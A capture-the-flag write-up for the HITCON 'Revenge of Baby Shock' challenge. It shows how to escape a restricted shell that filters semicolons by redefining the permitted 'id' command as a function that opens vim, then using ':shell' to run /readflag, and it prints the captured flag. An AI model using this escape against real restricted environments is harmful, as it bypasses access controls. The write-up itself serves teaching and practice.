# Revenge of Baby Shock
_Category: misc_

## Description
> `nc 13.113.249.141 1987`

## Short Solution
```sh
> id () vim
> id
> Vim: Warning: Output is not to a terminal
Vim: Warning: Input is not from a terminal
exit
:shell                                                        
/readflag
hitcon{r3v3ng3_f0r_semic010n_4nd_th4nks}
```

## Solution

To begin, we connect and see what we have:
```sh
connected!
welcome to Baby shock's revenge !!!
> help
> Available Commands: 
pwd ls mkdir netstat sort printf exit help id mount df du find history touch
```
This challenge is almost exactly the same as the earlier Baby Shock, however the <kbd>;</kbd> character has been restricted.

As we weren't sure what characters were best to use at this point, we wrote a pwntools script that would verify what printable ascii characters can be sent to the server without causing an error. This is relatively simple as the check is performed before the command runs, so we can test it by checking if we get an error when running a command like `id # ;`. If we get an error, the character (<kbd>;</kbd> in this case) wasn't allowed.

The full list of characters allowed isn't particularly interesting, but we did notice that parenthesis, both <kbd>(</kbd> and <kbd>)</kbd> were allowed. This lets us re-define an allowed command as a function, which lets us execute an arbitrary command. From here, we can continue exploitation as in the original Baby Shock challenge.

To launch vim, we simply redefine the `id` command:
```sh
> id () vim
> id
```
